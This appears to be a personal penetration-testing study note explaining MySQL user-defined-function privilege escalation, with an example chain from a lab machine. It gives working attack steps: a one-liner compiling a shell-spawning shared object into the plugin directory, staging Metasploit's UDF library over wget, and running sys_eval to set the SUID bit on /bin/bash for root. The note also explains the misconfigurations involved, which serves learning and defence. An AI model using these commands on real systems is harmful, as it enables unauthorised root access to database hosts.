---
type: technique
tags: [ejpt:host-net-pentest]
tools: [mysql, wget, metasploit]
cves: []
related: ["[[mysql-enumeration]]", "[[exim-lpe]]", "[[gitea]]", "[[gtfobins]]"]
---

# MySQL UDF Privilege Escalation

Loading an attacker-controlled shared object into MySQL via `CREATE FUNCTION … SONAME 'x.so'`, so the database server executes attacker code as the **mysql process's user** — privilege escalation through configuration, not a CVE.

## What a UDF is

A User-Defined Function is a C shared object MySQL loads at runtime and exposes as a SQL function:

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib.so';
SELECT sys_eval('id');        -- runs the command, returns stdout
```

- The code runs as the **mysql process owner** — whatever uid `mysqld` holds (root inside a container on [[gitea]], which is why `sys_eval('id')` there returned `uid=0`).
- Like [[exim-lpe]], this is a *feature*, not a vulnerability: `SONAME` loading is intended functionality. The bug is in who can use it.

## Three preconditions

1. **A login with `EXECUTE`-ish rights** — `CREATE FUNCTION` needs it; check with `SHOW GRANTS;`.
2. **A writable `@@plugin_dir`** — where MySQL looks for `.so` files. Normally `drwxr-xr-x root`; on [[gitea]] it was `drwxr-xrwx` (world-writable), the *write primitive* of the chain.
3. **A `.so` you can place there** — any write channel that reaches the directory (direct shell write, upload, or staging over HTTP as below).

Remove any one and the chain dies.

## Payload shapes

- **Hand-rolled constructor `.so`** — compiled on the box, runs at *LOAD* time (before any function call):

  ```sh
  echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' | gcc -w -fPIC -shared -o /usr/lib/mysql/plugin/lib.so -x c -
  ```

  The constructor fires the moment `CREATE FUNCTION` loads the object — no query needed afterwards. On [[gitea]] this route was written down and abandoned before being loaded.
- **Metasploit's ready-made `lib_mysqludf_sys_64.so`** — ships under `/usr/share/metasploit-framework/data/exploits/mysql/` and exports callable helpers (`sys_eval`, `sys_exec`), so commands run *per query* instead of at load.

## Workflow

1. **Verify**: `SHOW GRANTS;` → `select @@plugin_dir;` → `ls -la <plugin_dir>` (perms!).
2. **Stage the `.so`** via any write channel — here: attacker runs `python3 -m http.server` in metasploit's data dir, the box `wget`s it, `mv` into the plugin dir (world-writable, so a low-priv shell can write it).
3. **`CREATE FUNCTION … SONAME 'lib.so';`** then `select sys_eval('<command>');`.
4. **Grant, don't shell**: the canonical payload is

   ```sql
   SELECT sys_eval('chmod 4755 /bin/bash');
   ```

   followed by `/bin/bash -p` — a *privilege grant* consumed by the preserve-euid flag, the same endgame as [[suid-enumeration]]/[[gtfobins]] (cf. [[jenkhack]], [[vulnvault]]), reached from inside the database.

## Caveat

UDF abuse is **not a MySQL bug** — patching won't help. It's two misconfigurations (writable plugin dir + over-powerful account) stacked with a write channel. Check `SHOW GRANTS` and `@@plugin_dir` permissions *before* you start guessing passwords: this is the [[mysql-enumeration]] step that turns a login into a privesc path.

## Seen in

[[gitea]] (placeholder-leaked `admin` login → `EXECUTE` + `drwxr-xrwx` plugin dir → metasploit `.so` staged over `http.server`/`wget` → `sys_eval` → `chmod 4755 /bin/bash` → root)
